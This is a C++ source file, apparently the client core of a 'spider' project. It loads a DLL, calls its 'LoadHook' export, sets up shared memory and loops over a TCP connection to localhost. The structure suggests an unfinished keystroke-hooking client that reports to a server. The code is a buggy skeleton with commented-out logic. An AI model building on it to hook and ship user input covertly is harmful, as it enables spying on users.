#include "stdafx.h"
#include "Core.h"
#include <winsock2.h>

Core::Core()
{
	this->_cli = Utils::newTCPClient();
	this->_shm = new SharedMemoryServer("spider-shm");
	this->_writer = new writer();
	this->_IP = "127.0.0.1";
	this->_PORT = 22;
	this->_mod = 0;
}


Core::~Core()
{

}

void	Core::reseauTCP(const std::string IP, int port)
{
	if (this->_mod == 0)
		this->_buff = "Hello\n"; // proto toussa
	this->_cli->write(this->_buff);
	this->_cli->read(this->_buff, 2048);
}

void	Core::run()
{
	typedef void(*fnPtr)(void);

	this->_Dll = LoadLibrary(L"ClientDll.dll");
	if (this->_Dll == NULL) {
		printf("The DLL could not be found.n");
		getchar();
		return ;
	}
	fnPtr addr = (fnPtr)GetProcAddress(this->_Dll, "LoadHook");
	if (addr == NULL) {
		printf("The function was not found.n");
		getchar();
		return ;
	}
	addr();

	this->_cli->connect(this->_IP, this->_PORT);

	while (1)
	{
		this->_thr.launch(reseauTCP);
		//this->_thr.stop();
		//this->_mod = this->data.analyse();
		//this->data.dosmth();
		//this->_buffshm = this->_shm.read();
		std::cout << "Shm Inut : " << 1 << std::endl;
		Sleep(1000);
	}

}

void	Core::stop()
{
	this->_writer->clean_file();
}